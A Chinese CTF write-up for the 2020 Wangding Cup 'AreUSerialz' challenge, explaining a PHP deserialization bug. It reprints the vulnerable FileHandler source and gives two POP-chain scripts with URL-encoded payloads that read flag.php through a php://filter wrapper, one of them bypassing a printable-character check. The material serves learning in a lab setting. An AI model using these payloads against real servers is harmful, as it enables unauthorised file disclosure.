# 原创
：  [网鼎杯 2020 青龙组]AreUSerialz

# [网鼎杯 2020 青龙组]AreUSerialz

#### [网鼎杯 2020 青龙组]AreUSerialz

## 考点

> 
PHP反序列化


## 思路

> 
代码审计后发现，利用read()函数，file_get_contents($this-&gt;filename)，我们只需要传入我们需要的/flag就可以读取flag了；<br/> 需要注意绕过 is_vaild 函数,它规定了序列化内容中只能包含ascii可见字符,如果出现其他的字符则会返回false


## Payload

> 
审计源码


```
&lt;?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this-&gt;process();
    }

    public function process() {
        if($this-&gt;op == "1") {
            $this-&gt;write();
        } else if($this-&gt;op == "2") {
            $res = $this-&gt;read();
            $this-&gt;output($res);
        } else {
            $this-&gt;output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
            if(strlen((string)$this-&gt;content) &gt; 100) {
                $this-&gt;output("Too long!");
                die();
            }
            $res = file_put_contents($this-&gt;filename, $this-&gt;content);
            if($res) $this-&gt;output("Successful!");
            else $this-&gt;output("Failed!");
        } else {
            $this-&gt;output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this-&gt;filename)) {
            $res = file_get_contents($this-&gt;filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: &lt;br&gt;";
        echo $s;
    }

    function __destruct() {
        if($this-&gt;op === "2")
            $this-&gt;op = "1";
        $this-&gt;content = "";
        $this-&gt;process();
    }

}

function is_valid($s) {
    for($i = 0; $i &lt; strlen($s); $i++)
        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}

```

> 
POP链_1


```
&lt;?php
class FileHandler{
    public $op = 2;
    public $filename = 'php://filter/convert.base64-encode/resource=flag.php';
    public $content;
}

$a = new FileHandler();
echo urlencode(serialize($a));
?&gt;
=&gt;
O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A2%3A%22op%22%3Bi%3A2%3Bs%3A8%3A%22filename%22%3Bs%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3Bs%3A7%3A%22content%22%3BN%3B%7D

```

> 
POP链_2


```
&lt;?php
class FileHandler{
    protected $op = 2;
    protected $filename = 'php://filter/convert.base64-encode/resource=flag.php';
    protected $content;
}

$a = new FileHandler();
$a = serialize($a);
$a = str_replace(chr(0), '\00', $a);
$a = str_replace('s:', 'S:', $a);
echo urlencode($a);
?&gt;
=&gt;
O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22%5C00%2A%5C00op%22%3Bi%3A2%3BS%3A11%3A%22%5C00%2A%5C00filename%22%3BS%3A52%3A%22php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dflag.php%22%3BS%3A10%3A%22%5C00%2A%5C00content%22%3BN%3B%7D

```

<img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210519145730776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210519145739657.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center"/>
